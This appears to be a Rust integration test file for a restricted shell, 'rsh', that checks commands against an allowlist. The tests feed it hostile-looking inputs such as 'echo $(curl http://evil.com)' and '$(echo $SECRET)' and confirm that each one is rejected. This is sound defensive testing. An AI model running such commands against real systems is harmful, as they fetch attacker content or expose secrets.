use std::process::Command;

fn rsh_bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_rsh"))
}

#[test]
fn test_and_or_now_supported() {
    // && and || are now parsed and executed by brush-parser
    let output = rsh_bin()
        .arg("--inherit-env")
        .arg("echo hello && echo world")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("hello"));
    assert!(stdout.contains("world"));
}

#[test]
fn test_or_operator() {
    // || executes second command only if first fails
    let output = rsh_bin()
        .arg("false || echo fallback")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("fallback"));
}

#[test]
fn test_backtick_substitution_validates_inner_command() {
    // Backticks now parse; the inner command is validated against the allowlist
    let output = rsh_bin().arg("echo `whoami`").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("whoami") && stderr.contains("not in allowlist"),
        "stderr was: {}",
        stderr
    );
}

#[test]
fn test_command_substitution_validates_inner_command() {
    // $() now parses; the inner command is validated against the allowlist
    let output = rsh_bin().arg("echo $(whoami)").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("whoami") && stderr.contains("not in allowlist"),
        "stderr was: {}",
        stderr
    );
}

#[test]
fn test_command_substitution_with_allowed_command() {
    // $() with an allowed command should work
    let output = rsh_bin()
        .arg("--inherit-env")
        .arg("--dir")
        .arg(env!("CARGO_MANIFEST_DIR"))
        .arg("echo $(echo inner)")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert_eq!(stdout.trim(), "inner");
}

#[test]
fn test_parse_error_eval() {
    let output = rsh_bin().arg("eval echo hi").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    // eval is rejected at the allowlist level
    assert!(stderr.contains("eval"), "stderr was: {}", stderr);
    assert!(
        stderr.contains("not in allowlist"),
        "stderr was: {}",
        stderr
    );
}

#[test]
fn test_keywords_in_quotes_allowed() {
    // 'if' inside quotes should not be rejected
    let output = rsh_bin()
        .arg("--dir")
        .arg(env!("CARGO_MANIFEST_DIR"))
        .arg("grep 'if' src/main.rs")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn test_and_in_quotes_allowed() {
    // '&&' inside quotes should not be rejected
    let output = rsh_bin()
        .arg("--dir")
        .arg(env!("CARGO_MANIFEST_DIR"))
        .arg("grep '&&' src/validator.rs")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn test_if_then_fi_supported() {
    // if/then/fi is now supported
    let output = rsh_bin()
        .arg("if true; then echo yes; fi")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert_eq!(stdout.trim(), "yes");
}

#[test]
fn test_for_loop_supported() {
    // for loops are now supported
    let output = rsh_bin()
        .arg("--inherit-env")
        .arg("for x in a b c; do echo $x; done")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("a\nb\nc"));
}

#[test]
fn test_allowlist_rejection() {
    let output = rsh_bin().arg("curl http://example.com").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("not in allowlist"));
}

#[test]
fn test_empty_input() {
    let output = rsh_bin().arg("").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.is_empty(), "expected an error message on stderr");
}

#[test]
fn test_function_definition_rejected() {
    let output = rsh_bin().arg("foo() { echo hi; }").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("function"), "stderr was: {}", stderr);
}

#[test]
fn test_background_execution_rejected() {
    // sleep isn't in the allowlist, but & should be rejected at the syntax level first
    let output = rsh_bin()
        .arg("echo hello &")
        .output()
        .unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("background"), "stderr was: {}", stderr);
}

#[test]
fn test_unapproved_var_in_substitution_rejected() {
    // $() containing unapproved variable reference should be caught
    let output = rsh_bin().arg("echo $(echo $SECRET)").output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("SECRET") && stderr.contains("not allowed"),
        "stderr was: {}",
        stderr
    );
}

#[test]
fn test_nested_disallowed_command_in_substitution() {
    // $() with disallowed command should be rejected even when nested
    let output = rsh_bin()
        .arg("echo $(curl http://evil.com)")
        .output()
        .unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("curl") && stderr.contains("not in allowlist"),
        "stderr was: {}",
        stderr
    );
}
